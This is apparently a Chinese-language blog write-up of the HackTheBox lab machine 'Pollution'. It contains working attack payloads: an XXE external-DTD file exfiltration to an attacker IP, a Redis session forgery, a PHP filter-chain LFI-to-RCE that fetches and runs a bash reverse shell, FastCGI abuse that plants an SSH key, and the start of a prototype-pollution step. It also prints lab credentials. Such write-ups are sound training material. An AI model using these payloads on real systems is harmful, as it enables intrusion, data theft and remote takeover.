---
title: Pollution - HackTheBox
url: https://darkwing.moe/2022/12/26/Pollution-HackTheBox/
source: 喵喵喵喵
date: 2022-12-27
fetch_date: 2025-10-04T02:31:40.327524
---

# Pollution - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Pollution - HackTheBox

# Pollution - HackTheBox

##### 2022-12-26

#### TOC

1. [1. 基本信息](#基本信息)
   1. [1.1. 10.10.11.192](#10-10-11-192)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
3. [3. 子域名扫描](#子域名扫描)
   1. [3.1. forum](#forum)
   2. [3.2. developers](#developers)
4. [4. forum](#forum-1)
5. [5. COLLECT ADMIN](#COLLECT-ADMIN)
6. [6. POLLUTION API](#POLLUTION-API)
   1. [6.1. XXE](#XXE)
   2. [6.2. file read](#file-read)
   3. [6.3. file.dtd](#file-dtd)
7. [7. redis](#redis)
8. [8. LFI to RCE](#LFI-to-RCE)
   1. [8.1. shell](#shell)
9. [9. 信息](#信息)
10. [10. FastCGI](#FastCGI)
11. [11. user flag](#user-flag)
12. [12. 提权信息](#提权信息)
    1. [12.1. Messages\_send.js](#Messages-send-js)
13. [13. 提权 & root flag](#提权-amp-root-flag)
    1. [13.1. shadow](#shadow)
14. [14. 参考资料](#参考资料)

# Pollution - HackTheBox

2022-12-26

# 基本信息

* <https://www.hackthebox.com/home/machines/profile/517>
* ## 10.10.11.192

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122601.jpg)

# 端口扫描

22,80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.192 Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-26 13:08 CST Nmap scan report for 10.10.11.192 Host is up (0.19s latency). Not shown: 998 closed tcp ports (conn-refused) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: |   3072 db1d5c65729bc64330a52ba0f01ad5fc (RSA) |   256 4f7956c5bf20f9f14b9238edcefaac78 (ECDSA) |_  256 df47554f4ad178a89dcdf8a02fc0fca9 (ED25519) 80/tcp open  http    Apache httpd 2.4.54 ((Debian)) |_http-title: Home | http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set |_http-server-header: Apache/2.4.54 (Debian) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 62.48 seconds ``` |

## 80

公司官网，底部得到域名：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122602.jpg)

# 子域名扫描

加hosts后继续枚举子域名，发现forum和developers：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` 10.10.11.192 collect.htb  ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u "http://collect.htb/" -H 'Host: FUZZ.collect.htb' -fs 0,26197  forum                   [Status: 200, Size: 14098, Words: 910, Lines: 337, Duration: 325ms] developers              [Status: 401, Size: 469, Words: 42, Lines: 15, Duration: 189ms ``` |

两个子域名同样加hosts：

## forum

MyBB forum：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122603.jpg)

## developers

需要登录：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122604.jpg)

# forum

forum任意注册登录,memberlist中可以得到用户名列表：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122605.jpg)

浏览论坛内容，知道Pollution API和k8s,附件中还可以得到一些请求响应信息,包括使用的token:

|  |  |
| --- | --- |
| ``` 1 ``` | ``` token ： ddac62a28254561001277727cb397baf ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122606.jpg)

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122607.jpg)

# COLLECT ADMIN

注意得到的请求是针对主站的，看起来是设置管理员的，所以我们回到主站，注册账号登录，然后使用token把我们设置为admin：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122608.jpg)

admin界面是注册POLLUTION API的账号：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122609.jpg)

# POLLUTION API

随意测试添加，发现使用XML：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122610.jpg)

## XXE

常规XXE：

* XXE - XEE - XML External Entity - HackTricks
  <https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#html-entities>

数据格式大概这样，把xxe-payload 放在合法数据中：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` manage_api=<?xml version="1.0" encoding="UTF-8"?><xxe-payload><root><method>POST</method><uri>/auth/register</uri><user><username>miao1</username><password>123456</password></user></root> ``` |

## file read

|  |  |
| --- | --- |
| ``` 1 ``` | ``` manage_api=<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.10.14.5:7777/file.dtd"> %xxe;]><root>..... ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122611.jpg)

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122612.jpg)

后面就是一点点读文件，../bootstrp.php中得到redis密码：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` COLLECTR3D1SPASS ``` |

/var/www/developers/.htpasswd中也能得到一个hash，破解出来developer密码：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` developers_group:r0cket ``` |

## file.dtd

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` <!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=index.php'> <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.14.5:7777/?file=%file;'>"> %eval; %exfiltrate; ``` |

# redis

使用得到的密码查看redis，发现里面是我们的session id：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122613.jpg)

developer中使用得到的账号密码登录后还有第二层登录，这时redis中多了一条数据，是developer那边的,可以尝试直接修改为已认证数据，绕过登录：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122614.jpg)

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122615.jpg)

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.192:6379> set PHPREDIS_SESSION:64eocsg047rtkcf4j9s7ffubfr "username|s:4:\"miao\";role|s:5:\"admin\";auth|s:1:\"a\";" ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122616.jpg)

# LFI to RCE

page参数LFI，使用php filter进行RCE：

* synacktiv/php\_filter\_chain\_generator
  <https://github.com/synacktiv/php_filter_chain_generator>
* hxp CTF 2021 - The End Of LFI? - 跳跳糖
  <https://tttang.com/archive/1395/>

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122617.jpg)

## shell

需要尽可能短，所以我们通过下载执行的方式,得到www-data shell：

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` # file m bash -i >& /dev/tcp/10.10.14.5/4444 0>&1  python3 php_filter_chain_generator.py --chain '<?=`wget -O - 10.10.14.5/m|bash`?>' ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122618.jpg)

# 信息

/var/www/developers/login.php中得到数据库密码：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` $db = new mysqli("localhost", "webapp_user", "Str0ngP4ssw0rdB*12@1", "developers"); ``` |

9000端口运行着FastCGI：

* Fastcgi PHP-FPM Client && Code Execution
  <https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75>

# FastCGI

fastcgi是victor权限：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122619.jpg)

我们可以把公钥写到victor用户目录，从而ssh连接：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` python3 fpm.py -c '<?php system("echo \"ssh-rsa ...\" > /home/victor/.ssh/authorized_keys"); exit; ?>' 127.0.0.1 /tmp/miao.php ``` |

# user flag

victor用户目录得到user.txt:

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122620.jpg)

# 提权信息

常规枚举发现root运行的`/usr/bin/node /root/pollution_api/index.js`

在 victor 的主目录中有一份代码副本：`/home/victor/pollution_api`

查看代码结合靶机名称，很容易发现原型链污染漏洞,Messages\_send.js中调用merge：

* Prototype Pollution to RCE - HackTricks
  <https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#exec-exploitation>

因此，对于我们的漏洞利用，我们需要以管理员用户身份对 API 进行身份验证，然后制作恶意污染的负载以获取 RCE。

## Messages\_send.js

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 ``` | ``` const Message = require('../models/Message'); const { decodejwt } = require('../functions/jwt'); const _ = require('lodash'); const { exec } = require('child_process');  const messages_send = async(req,res)=>{     const token = decodejwt(req.headers['x-access-token'])     if(req.body.text){          const message = {             user_sent: token.user,             title: "Message for admins",         }; ...